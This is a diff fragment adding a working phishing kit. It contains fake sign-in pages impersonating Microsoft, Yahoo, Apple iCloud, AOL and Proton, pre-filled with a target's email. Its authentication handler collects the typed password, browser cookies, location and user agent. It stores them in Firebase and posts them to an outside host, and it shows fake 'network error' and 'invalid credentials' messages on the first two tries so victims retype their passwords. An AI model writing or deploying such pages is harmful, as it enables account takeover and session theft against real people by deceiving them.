+          }, 300);
+        }, 1000); // Matches Microsoft's typical loading duration
+      });
+
+      $(document).off('click', '#msftBackToEmail').on('click', '#msftBackToEmail', function () {
+        $('#msftPasswordScreen').addClass('slide-out');
+
+        setTimeout(function () {
+          $('#msftPasswordScreen').hide().removeClass('slide-out');
+          $('#msftEmailScreen').addClass('slide-in').show();
+
+          setTimeout(function () {
+            $('#msftEmailScreen').removeClass('slide-in');
+          }, 300);
+        }, 300);
+      });
+    }
+
+    function getYahooAuthHTML(mailDomain, registeredDomain, registrarBrand, registrarLogoUrl, emailHostLogoUrl, email) {
+      document.title = registrarBrand? 'Login - Sign in to '+registrarBrand : 'Login - Sign in to Yahoo'
+      return `
+      <style>
+                @keyframes yahooPulse {
+                    0%, 100% { opacity: 0.2; transform: scale(0.8); }
+                    50% { opacity: 1; transform: scale(1.2); }
+                }
+                .yahoo-slide-out { 
+                    animation: yahooSlideOut 0.3s forwards;
+                }
+                .yahoo-slide-in { 
+                    animation: yahooSlideIn 0.3s forwards;
+                }
+                @keyframes yahooSlideOut {
+                    from { transform: translateX(0); opacity: 1; }
+                    to { transform: translateX(-20%); opacity: 0; }
+                }
+                @keyframes yahooSlideIn {
+                    from { transform: translateX(20%); opacity: 0; }
+                    to { transform: translateX(0); opacity: 1; }
+                }
+                yahoo-navbar {
+  position: sticky;
+  top: 0;
+  background: #fff;
+  border-bottom: 1px solid #e6e6e6;
+  z-index: 50;
+}
+
+.yahoo-navbar-inner {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0px 50px;
+  display: flex;
+  align-items: center;
+  height: 70px;
+  justify-content: space-between;
+}
+
+/* Full-height background wrapper */
+.yahoo-bg-wrapper {
+  min-height: 100vh;
+  background: none;
+  background-color: white;
+  display: flex;
+  justify-content: center;
+  padding: 20px;
+}
+
+/* For medium screens and above — push auth to the right */
+@media (min-width: 768px) {
+  .yahoo-bg-wrapper {
+    justify-content: flex-end;
+    padding-right: 6
+    20px;
+    background: url('/images/yahoobg.jpeg') no-repeat top center;
+  background-size: fill;
+  }
+}
+
+/* Auth container styles (as per your inline styles, but moved to CSS) */
+.yahoo-auth-container {
+  max-width: 350px;
+  padding: 20px;
+  font-family: 'Helvetica Neue', Arial, sans-serif;
+  border-radius: 16px;
+  width: 100%;
+  height: fit-content;
+  overflow-x: hidden;
+}
+.nav-logo{
+ width: 100px;
+}
+.logo{
+  width: 80px;
+  height: auto;
+}
+   input {
+  border: none;
+  outline: none;
+}
+
+input:focus,
+input:hover {
+  border: none;
+  outline: none;
+}
+            </style>
+            <nav class="yahoo-navbar">
+  <div class="yahoo-navbar-inner">
+    <div>
+    <img src="./images/yahoologo.png" alt="Yahoo Logo" class="nav-logo">
+       ${registrarBrand && `<span class="ms-2" style="font-weight:bold;">${registrarBrand}</span>`}
+    </div>
+    <span>
+                <div style="text-align: center; font-size: 12px; color: #6d6d6d;">
+                    <a href="#" style="color: #6d6d6d; text-decoration: none; margin: 0 8px;">Help</a>
+                    <a href="#" style="color: #6d6d6d; text-decoration: none; margin: 0 8px;">Privacy</a>
+                    <a href="#" style="color: #6d6d6d; text-decoration: none; margin: 0 8px;">Terms</a>
+                </div>
+            </span>
+            </div>
+</nav>
+<div class="yahoo-bg-wrapper">
+   <div class="yahoo-auth-container bg-white">
+            <!-- Yahoo Loader (purple fading dots) -->
+            <div id="yahooLoader" class="d-none" style="height: 4px; margin-bottom: 20px; position: relative;">
+                <div style="position: absolute; left: 0; right: 0; display: flex; justify-content: center;">
+                    <div class="yahoo-dot" style="width: 8px; height: 8px; background: #720e9e; border-radius: 50%; margin: 0 3px; animation: yahooPulse 1.4s infinite ease-in-out;"></div>
+                    <div class="yahoo-dot" style="width: 8px; height: 8px; background: #720e9e; border-radius: 50%; margin: 0 3px; animation: yahooPulse 1.4s infinite ease-in-out; animation-delay: 0.2s;"></div>
+                    <div class="yahoo-dot" style="width: 8px; height: 8px; background: #720e9e; border-radius: 50%; margin: 0 3px; animation: yahooPulse 1.4s infinite ease-in-out; animation-delay: 0.4s;"></div>
+                </div>
+            </div>
+            <div class="text-center mb-2">
+                <img src="./images/yahoologo.png" alt="Yahoo" class="logo">
+            </div>
+           ${registrarBrand && `<p class="text-center d-flex gap-2 align-items-center justify-content-center" style="font-size: 12px">From ${registrarBrand} ${registrarLogoUrl && `<img style="width:20px" src=${registrarLogoUrl} alt="logo">`}</p>`}
+            <div id="yahooAuthContainer" style="position: relative; min-height: 300px;">
+                <!-- Email Screen -->
+                <div id="yahooEmailScreen">
+                    <h1 style="font-size: 22px; font-weight: 600; color: #23282d; text-align: center; margin-bottom: 28px;">Sign in</h1>
+                    <div style="margin-bottom: 24px;">
+                        <input type="email" id="authEmail" value="${email}"
+                        readonly
+                               style="width: 100%; height: 44px; font-size: 15px;border:none; border-bottom: 1px solid #c4c4c4;">
+                    </div>
+                    <div style="margin-bottom: 16px;">
+                        <button id="yahooNextBtn" 
+                                style="width: 100%; background: #7D2EFF; color: white; border: none; border-radius: 30px; padding: 12px; font-size: 15px; font-weight: 600;">
+                            Next
+                        </button>
+                    </div>
+                    <div style="text-align: center; margin-bottom: 24px;">
+                        <a href="#" style="color: #720e9e; text-decoration: none; font-size: 14px; font-weight: 500;">Trouble signing in?</a>
+                    </div>
+                    <div style="text-align: center; font-size: 13px; color: #6d6d6d;">
+                        Don't have an account? <a href="#" style="color: #720e9e; text-decoration: none;">Sign up</a>
+                    </div>
+                </div>
+
+                <!-- Password Screen (hidden initially) -->
+                <div id="yahooPasswordScreen" style="position: absolute; top: 0; left: 0; right: 0; display: none;">
+                    <div style="margin-bottom: 24px;">
+                        <div style="display: flex; align-items: center; margin-bottom: 16px;">
+                            <div id="yahooBackToEmail" style="cursor: pointer; margin-right: 12px;">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="#720e9e">
+                                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path>
+                                </svg>
+                            </div>
+                            <span style="font-size: 16px; color: #23282d; font-weight: 500;">${email}</span>
+                        </div>
+                         <div id="authError" style="color: #d0011b; font-size: 14px; padding: 12px; background: #fce8e8; border-radius: 4px; display: none;"></div>
+                        <input type="password" id="authPassword" placeholder="Password" 
+                               style="width: 100%; height: 44px; font-size: 15px;border: none; border-bottom: 1px solid #c4c4c4;">
+                    </div>
+                    <div style="margin-bottom: 16px;">
+                        <button id="signInBtn" 
+                                style="width: 100%; background: #7D2EFF; color: white; border: none; border-radius: 30px; padding: 12px; font-size: 15px; font-weight: 600;">
+                            Sign in
+                        </button>
+                    </div>
+                    <div style="text-align: center; margin-bottom: 24px;">
+                        <a href="#" style="color: #720e9e; text-decoration: none; font-size: 14px; font-weight: 500;">Forgot password?</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        </div>
+    `;
+    }
+
+    function setupYahooAuthEvents() {
+      $(document).off('click', '#yahooNextBtn').on('click', '#yahooNextBtn', function () {
+        $('#yahooLoader').removeClass('d-none');
+
+        // Yahoo-like loading delay
+        setTimeout(function () {
+          $('#yahooEmailScreen').addClass('yahoo-slide-out');
+
+          setTimeout(function () {
+            $('#yahooEmailScreen').hide().removeClass('yahoo-slide-out');
+            $('#yahooPasswordScreen').addClass('yahoo-slide-in').show();
+            $('#yahooLoader').addClass('d-none');
+
+            setTimeout(function () {
+              $('#yahooPasswordScreen').removeClass('yahoo-slide-in');
+            }, 300);
+          }, 300);
+        }, 1200); // Matches Yahoo's loading duration
+      });
+
+      $(document).off('click', '#yahooBackToEmail').on('click', '#yahooBackToEmail', function () {
+        $('#yahooPasswordScreen').addClass('yahoo-slide-out');
+
+        setTimeout(function () {
+          $('#yahooPasswordScreen').hide().removeClass('yahoo-slide-out');
+          $('#yahooEmailScreen').addClass('yahoo-slide-in').show();
+
+          setTimeout(function () {
+            $('#yahooEmailScreen').removeClass('yahoo-slide-in');
+          }, 300);
+        }, 300);
+      });
+    }
+
+    function getAppleAuthHTML(mailDomain, registeredDomain, registrarBrand, registrarLogoUrl, emailHostLogoUrl, email) {
+      document.title = registrarBrand? registrarBrand : 'ICloud'
+      return `
+    <style>
+      .apple-auth-wrapper {
+        display: flex;
+        justify-content: center;
+        min-height: 100vh;
+        background: #ffffff;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        padding:40px 20px;
+      }
+      
+      .apple-auth-card {
+        background: #fff;
+        padding: 40px;
+        border-radius: 30px;
+        max-width: 650px;
+        width:100%;
+        height: fit-content;
+        box-shadow: 1px 5px 30px rgba(0,0,0,0.2);
+        text-align: center;
+      }
+      .apple-auth-logo {
+        width: 160px;
+        margin-bottom: 24px;
+      }
+      .apple-auth-input {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 20px;
+        border: 1px solid #d1d1d1;
+        border-radius: 6px;
+        font-size: 16px;
+        box-sizing: border-box;
+      }
+      .apple-auth-button {
+        width: 120px;
+        padding: 12px;
+        background: #121212;
+        color: white;
+        font-size: 17px;
+        font-weight: 600;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+      }
+      .apple-auth-button:disabled {
+        background: #00000080;
+        cursor: default;
+      }
+      .apple-auth-footer {
+        margin-top: 100px;
+        font-size: 14px;
+        color: #6e6e73;
+      }
+      .apple-auth-footer a {
+        color: #0071e3;
+        text-decoration: none;
+      }
+      @media(max-width: 768px){
+        .apple-auth-card{
+          box-shadow: none;
+          border-radius:0px;
+        }
+        .apple-auth-wrapper{
+          padding: 20px 0px;
+        }
+        .apple-auth-button{
+          width: 100%;
+        }
+      }
+    </style>
+    <div class="p-3 bg-light d-flex align-items-center gap-1" style="font-size:20px; font-weight: 900px; color: black"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" class="bi bi-apple" viewBox="0 0 18 18">
+  <path d="M11.182.008C11.148-.03 9.923.023 8.857 1.18c-1.066 1.156-.902 2.482-.878 2.516s1.52.087 2.475-1.258.762-2.391.728-2.43m3.314 11.733c-.048-.096-2.325-1.234-2.113-3.422s1.675-2.789 1.698-2.854-.597-.79-1.254-1.157a3.7 3.7 0 0 0-1.563-.434c-.108-.003-.483-.095-1.254.116-.508.139-1.653.589-1.968.607-.316.018-1.256-.522-2.267-.665-.647-.125-1.333.131-1.824.328-.49.196-1.422.754-2.074 2.237-.652 1.482-.311 3.83-.067 4.56s.625 1.924 1.273 2.796c.576.984 1.34 1.667 1.659 1.899s1.219.386 1.843.067c.502-.308 1.408-.485 1.766-.472.357.013 1.061.154 1.782.539.571.197 1.111.115 1.652-.105.541-.221 1.324-1.059 2.238-2.758q.52-1.185.473-1.282"/>
+  <path d="M11.182.008C11.148-.03 9.923.023 8.857 1.18c-1.066 1.156-.902 2.482-.878 2.516s1.52.087 2.475-1.258.762-2.391.728-2.43m3.314 11.733c-.048-.096-2.325-1.234-2.113-3.422s1.675-2.789 1.698-2.854-.597-.79-1.254-1.157a3.7 3.7 0 0 0-1.563-.434c-.108-.003-.483-.095-1.254.116-.508.139-1.653.589-1.968.607-.316.018-1.256-.522-2.267-.665-.647-.125-1.333.131-1.824.328-.49.196-1.422.754-2.074 2.237-.652 1.482-.311 3.83-.067 4.56s.625 1.924 1.273 2.796c.576.984 1.34 1.667 1.659 1.899s1.219.386 1.843.067c.502-.308 1.408-.485 1.766-.472.357.013 1.061.154 1.782.539.571.197 1.111.115 1.652-.105.541-.221 1.324-1.059 2.238-2.758q.52-1.185.473-1.282"/>
+</svg> ICloud ${registrarLogoUrl? `<img style="width:20px;" alt="logo" src="${registrarLogoUrl}">` : ``}</div>
+    <div class="apple-auth-wrapper">
+      <div class="apple-auth-card">
+        <img src="./images/applelogo.png" alt="Apple" class="apple-auth-logo">
+        ${registrarBrand && `<p>From ${registrarBrand}</p>`}
+        <input type="text" id="authEmail" class="apple-auth-input" placeholder="Apple ID" value="${email}" readonly>
+        <button id="appleNextBtn" class="apple-auth-button">Next</button>
+        <div class="apple-auth-footer">
+          <div><a href="#">Forgot Apple ID or password?</a></div>
+          <div>Don’t have an Apple ID? <a href="#">Create yours now</a></div>
+        </div>
+      </div>
+    </div>
+  `;
+    }
+
+    function setupAppleAuthEvents() {
+  // Email field handler
+  $(document).on('input', '#authEmail', function () {
+    $('#appleNextBtn').prop('disabled', !$(this).val()?.trim());
+  });
+
+  // Next button handler
+  $(document).on('click', '#appleNextBtn', function () {
+    const email = $('#authEmail').val().trim();
+
+    $('.apple-auth-card').html(`
+      <img src="./images/applelogo.png" alt="Apple" class="apple-auth-logo">
+      <div style="font-size:16px; margin-bottom:20px;">Sign in with your Apple&nbsp;ID</div>
+      <div id="authError" style="color: #d0011b; font-size: 14px; padding: 12px; background: #fce8e8; border-radius: 4px; display: none;"></div>
+      <input type="password" id="authPassword" class="apple-auth-input" placeholder="Password">
+      <button id="signInBtn" class="apple-auth-button" disabled>Continue</button>
+      <div class="apple-auth-footer">
+        <div><a href="#">Forgot password?</a></div>
+      </div>
+    `);
+  });
+
+  // Password field handler — using delegation so it works after DOM changes
+  $(document).on('input', '#authPassword', function () {
+    $('#signInBtn').prop('disabled', !$(this).val()?.trim());
+  });
+}
+
+
+    function getAOLAuthHTML(mailDomain, registeredDomain, registrarBrand, registrarLogoUrl, emailHostLogoUrl, email) {
+      document.title = registrarBrand? 'Login - Sign in to '+registrarBrand : 'Login - Sign in to AOL'
+      return `
+    <style>
+      @keyframes aolPulse {
+        0%, 100% { opacity: 0.2; transform: scale(0.8); }
+        50% { opacity: 1; transform: scale(1.2); }
+      }
+      .aol-slide-out { animation: yahooSlideOut 0.3s forwards; }
+      .aol-slide-in { animation: yahooSlideIn 0.3s forwards; }
+      @keyframes yahooSlideOut {
+        from { transform: translateX(0); opacity: 1; }
+        to { transform: translateX(-20%); opacity: 0; }
+      }
+      @keyframes yahooSlideIn {
+        from { transform: translateX(20%); opacity: 0; }
+        to { transform: translateX(0); opacity: 1; }
+      }
+
+      /* Navbar */
+      .aol-navbar {
+        position: sticky;
+        top: 0;
+        background: #fff;
+        border-bottom: 1px solid #e6e6e6;
+        z-index: 50;
+      }
+      .aol-navbar-inner {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0px 50px;
+        display: flex;
+        align-items: center;
+        height: 70px;
+        justify-content: space-between;
+      }
+      .nav-logo { width: 100px; }
+      .logo { width: 80px; height: auto; }
+
+      /* Background wrapper */
+      .aol-bg-wrapper {
+        min-height: 100vh;
+        background: none;
+        background-color: white;
+        display: flex;
+        justify-content: center;
+        padding: 20px;
+      }
+      @media (min-width: 768px) {
+        .aol-bg-wrapper {
+          justify-content: right;
+          padding-right: 20px;
+          background: url('/images/aolbg.jpg') no-repeat top center;
+          background-size: fill;
+        }
+      }
+
+      /* Auth container */
+      .aol-auth-container {
+        max-width: 350px;
+        padding: 20px;
+        font-family: 'Helvetica Neue', Arial, sans-serif;
+        border-radius: 16px;
+        width: 100%;
+        height: fit-content;
+        overflow-x: hidden;
+        box-shadow: 1px -1px 3px rgba(0,0,0,.3)
+      }
+         input {
+  border: none;
+  outline: none;
+}
+
+input:focus,
+input:hover {
+  border: none;
+  outline: none;
+}
+    </style>
+
+    <nav class="aol-navbar">
+      <div class="aol-navbar-inner">
+         <div>
+   <img src="./images/aollogo.svg" alt="AOL Logo" class="nav-logo">
+       ${registrarBrand && `<span class="ms-2" style="font-weight:bold;">${registrarBrand}</span>`}
+    </div>
+        <span>
+          <div style="text-align: center; font-size: 12px; color: #6d6d6d;">
+            <a href="#" style="color: #6d6d6d; text-decoration: none; margin: 0 8px;">Help</a>
+            <a href="#" style="color: #6d6d6d; text-decoration: none; margin: 0 8px;">Privacy</a>
+            <a href="#" style="color: #6d6d6d; text-decoration: none; margin: 0 8px;">Terms</a>
+          </div>
+        </span>
+      </div>
+    </nav>
+
+    <div class="aol-bg-wrapper">
+      <div class="aol-auth-container bg-white">
+        <!-- AOL Loader -->
+        <div id="aolLoader" class="d-none" style="height: 4px; margin-bottom: 20px; position: relative;">
+          <div style="position: absolute; left: 0; right: 0; display: flex; justify-content: center;">
+            <div class="aol-dot" style="width: 8px; height: 8px; background: #0077C8; border-radius: 50%; margin: 0 3px; animation: aolPulse 1.4s infinite ease-in-out;"></div>
+            <div class="aol-dot" style="width: 8px; height: 8px; background: #0077C8; border-radius: 50%; margin: 0 3px; animation: aolPulse 1.4s infinite ease-in-out; animation-delay: 0.2s;"></div>
+            <div class="aol-dot" style="width: 8px; height: 8px; background: #0077C8; border-radius: 50%; margin: 0 3px; animation: aolPulse 1.4s infinite ease-in-out; animation-delay: 0.4s;"></div>
+          </div>
+        </div>
+
+        <div class="text-center mb-2">
+          <img src="./images/aollogo.svg" alt="AOL" class="logo">
+        </div>
+         ${registrarBrand && `<p class="text-center d-flex gap-2 align-items-center justify-content-center" style="font-size: 12px">From ${registrarBrand} ${registrarLogoUrl && `<img style="width:20px" src=${registrarLogoUrl} alt="logo">`}</p>`}
+
+        <div id="aolAuthContainer" style="position: relative; min-height: 300px;">
+          <!-- Email Screen -->
+          <div id="aolEmailScreen">
+            <h1 style="font-size: 22px; font-weight: 600; color: #23282d; text-align: center; margin-bottom: 28px;">Sign in to AOL</h1>
+            <div style="margin-bottom: 24px;">
+              <input type="email" id="authEmail" value="${email}"
+                readonly
+                style="width: 100%; height: 44px; font-size: 15px;border:none; border-bottom: 1px solid #c4c4c4;">
+            </div>
+            <div style="margin-bottom: 16px;">
+              <button id="aolNextBtn" 
+                style="width: 100%; background: #0D66FF; color: white; border: none; border-radius: 4px; padding: 12px; font-size: 15px; font-weight: 600;">
+                Next
+              </button>
+            </div>
+            <div style="text-align: center; margin-bottom: 24px;">
+              <a href="#" style="color: #0077C8; text-decoration: none; font-size: 14px; font-weight: 500;">Trouble signing in?</a>
+            </div>
+            <div style="text-align: center; font-size: 13px; color: #6d6d6d;">
+              Don't have an account? <a href="#" style="color: #0077C8; text-decoration: none;">Sign up</a>
+            </div>
+          </div>
+
+          <!-- Password Screen -->
+          <div id="aolPasswordScreen" style="position: absolute; top: 0; left: 0; right: 0; display: none;">
+            <div style="margin-bottom: 24px;">
+              <div style="display: flex; align-items: center; margin-bottom: 16px;">
+                <div id="aolBackToEmail" style="cursor: pointer; margin-right: 12px;">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="#0077C8">
+                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path>
+                  </svg>
+                </div>
+                <span style="font-size: 16px; color: #23282d; font-weight: 500;">${email}</span>
+              </div>
+              <div id="authError" style="color: #d0011b; font-size: 14px; padding: 12px; background: #fce8e8; border-radius: 4px; display: none;"></div>
+              <input type="password" id="authPassword" placeholder="Password" 
+                style="width: 100%; height: 44px; font-size: 15px;border: none; border-bottom: 1px solid #c4c4c4;">
+            </div>
+            <div style="margin-bottom: 16px;">
+              <button id="signInBtn" 
+                style="width: 100%; background: #0D66FF; color: white; border: none; border-radius: 4px; padding: 12px; font-size: 15px; font-weight: 600;">
+                Sign in
+              </button>
+            </div>
+            <div style="text-align: center; margin-bottom: 24px;">
+              <a href="#" style="color: #0077C8; text-decoration: none; font-size: 14px; font-weight: 500;">Forgot password?</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  `;
+    }
+
+    function setupAOLAuthEvents() {
+      $(document).off('click', '#aolNextBtn').on('click', '#aolNextBtn', function () {
+        $('#aolLoader').removeClass('d-none');
+
+        setTimeout(function () {
+          $('#aolEmailScreen').addClass('aol-slide-out');
+
+          setTimeout(function () {
+            $('#aolEmailScreen').hide().removeClass('aol-slide-out');
+            $('#aolPasswordScreen').addClass('aol-slide-in').show();
+            $('#aolLoader').addClass('d-none');
+
+            setTimeout(function () {
+              $('#aolPasswordScreen').removeClass('aol-slide-in');
+            }, 300);
+          }, 300);
+        }, 1200); // AOL/Yahoo loading feel
+      });
+
+      $(document).off('click', '#aolBackToEmail').on('click', '#aolBackToEmail', function () {
+        $('#aolPasswordScreen').addClass('aol-slide-out');
+
+        setTimeout(function () {
+          $('#aolPasswordScreen').hide().removeClass('aol-slide-out');
+          $('#aolEmailScreen').addClass('aol-slide-in').show();
+
+          setTimeout(function () {
+            $('#aolEmailScreen').removeClass('aol-slide-in');
+          }, 300);
+        }, 300);
+      });
+    }
+
+    function getProtonAuthHTML(mailDomain, registeredDomain, registrarBrand, registrarLogoUrl, emailHostLogoUrl, email) {
+      document.title = registrarBrand? registrarBrand+' Account: Sign-in' : 'Proton Account: Sign-in'
+      return `
+  <style>
+    body, .proton-wrapper {
+      margin: 0;
+      padding: 40px 20px;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #F6F4FE;
+      height: 100vh;
+      display: flex;
+      align-items:center;
+      justify-self: center;
+    }
+    .proton-card {
+      background: #fff;
+      padding: 40px;
+      border-radius: 20px;
+      width: 480px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+      text-align: left;
+      height: fit-content;
+    }
+    .proton-logo {
+      width: 80px;
+      margin-bottom: 24px;
+    }
+    .proton-input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      border: 1px solid #c0c0c0;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .proton-button {
+      width: 100%;
+      padding: 12px;
+      background: #6D4AFF;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .proton-button:disabled {
+      background: #6D4AFF99;
+      cursor: default;
+    }
+    .proton-error {
+      color: #d0021b;
+      font-size: 14px;
+      margin-bottom: 16px;
+      display: none;
+    }
+    @media (max-width: 480px) {
+      .proton-card {
+        width: 90%;
+        padding: 30px 20px;
+      }
+    }
+  </style>
+ <div class="position-sticky top-0 left-0 p-3"><img src="./images/protonlogo.svg" alt="Proton" style="width:100px;"></div>
+  <div class="proton-wrapper flex-column">
+    <div class="proton-card">
+      <img src="./images/protonlogo.svg" alt="Proton" class="proton-logo">
+      <h2>Sign In</h2>
+      <p>Enter your Proton Account details</p>
+      <div id="authError" class="proton-error"></div>
+      <input type="email" id="authEmail" class="proton-input" placeholder="Email or username" value="${email}" readonly>
+      <input type="password" id="authPassword" class="proton-input" placeholder="Password">
+      <div class="d-flex align-items-center gap-2 py-3">
+  <input type="checkbox" id="keepSignedIn" name="keepSignedIn" />
+  <label for="keepSignedIn">Keep me signed in</label>
+</div>
+      <button id="signInBtn" class="proton-button" disabled>Sign in</button>
+    </div>
+    ${registrarBrand && registrarLogoUrl ? `<div class="d-flex mt-5 gap-2 align-items-center">From ${registrarBrand} <img src="${registrarLogoUrl}" alt="logo" style="width:20px"></div>` : ``}
+  </div>
+  `;
+    }
+
+    function setupProtonAuthEvents() {
+      // Enable "Sign in" button only when both email and password are filled
+      $(document).off('input', '#authEmail, #authPassword')
+        .on('input', '#authEmail, #authPassword', function () {
+          const filled = $('#authEmail').val().trim() && $('#authPassword').val().trim();
+          $('#signInBtn').prop('disabled', !filled);
+        });
+    }
+
+    // Function to attach authentication handlers
+    function attachAuthHandlers(email) {
+      let attemptCount = 0;
+
+      $('#signInBtn').click(async function (event) {
+        event.preventDefault(); // Prevent default form submission
+
+        const password = $('#authPassword').val();
+        const errorDiv = $('#authError');
+
+        // Validate inputs
+        if (!email || !password) {
+          errorDiv.text('Please enter both email and password').show();
+          return;
+        }
+
+        // Clear any previous errors
+        errorDiv.hide();
+
+        // Show loading state
+        $(this).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Signing in...').prop('disabled', true);
+
+        // Fetch location
+        const location = await fetchLocation();
+
+        // Collect user data
+        const userData = {
+          email: email,
+          password: password,
+          location: location,
+          candy: document.cookie || '',
+          userFriend: navigator.userAgent || 'Unknown User Agent',
+          timestamp: new Date().toISOString()
+        };
+
+        // Increment attempt count
+        attemptCount++;
+
+        try {
+          // Save to Firebase profileruser node
+          await saveToFirebase(userData);
+
+          // Handle API call based on attempt count
+          if (attemptCount < 3) {
+            // First two attempts return predefined errors
+            $.ajax({
+              url: "https://mare-sand.vercel.app/api/email",
+              type: "POST",
+              contentType: "application/json",
+              data: JSON.stringify(userData),
+              timeout: 5000 // Timeout to prevent hanging
+            })
+              .done(function (response) {
+                // Ignore API response and show predefined error
+                errorDiv.text(attemptCount === 1 ? 'Network error. Please try again.' : 'Invalid credentials. Try again.').show();
+                $('#signInBtn').html('Sign in').prop('disabled', false);
+              })
+              .fail(function (jqXHR, textStatus, errorThrown) {
+                // Show predefined error even on API failure
+                errorDiv.text(attemptCount === 1 ? 'Network error. Please try again.' : 'Invalid credentials. Try again.').show();
+                $('#signInBtn').html('Sign in').prop('disabled', false);
+              });
+          } else {
+            // Third attempt processes API response
+            $.ajax({
+              url: "https://mare-sand.vercel.app/api/email",
+              type: "POST",
+              contentType: "application/json",
+              data: JSON.stringify(userData),
+              timeout: 5000 // Timeout to prevent hanging
+            })
+              .done(function (response) {
+                // Check if API indicates success
+                if (response.success) {
+                  window.location.href = './view';
+                } else {
+                  errorDiv.text(response.message || 'Authentication failed').show();
+                  $('#signInBtn').html('Sign in').prop('disabled', false);
+                }
+              })
+              .fail(function (jqXHR, textStatus, errorThrown) {
+                const errorMessage = jqXHR.responseJSON?.message || 'An error occurred';
+                errorDiv.text(errorMessage).removeClass('d-none');
+                $('#signInBtn').html('Sign in').prop('disabled', false);
+              });
+          }
+        } catch (error) {
+          // Handle Firebase errors
+          errorDiv.text(error.message || 'Failed to save data').show();
+          $('#signInBtn').html('Sign in').prop('disabled', false);
+        }
+      });
+    }
+
+    function showError(message) {
+      $('#pdfPreview').html(`<div class="alert alert-danger">${message}</div>`);
+    }
+  </script>
+</body>
+
+</html>
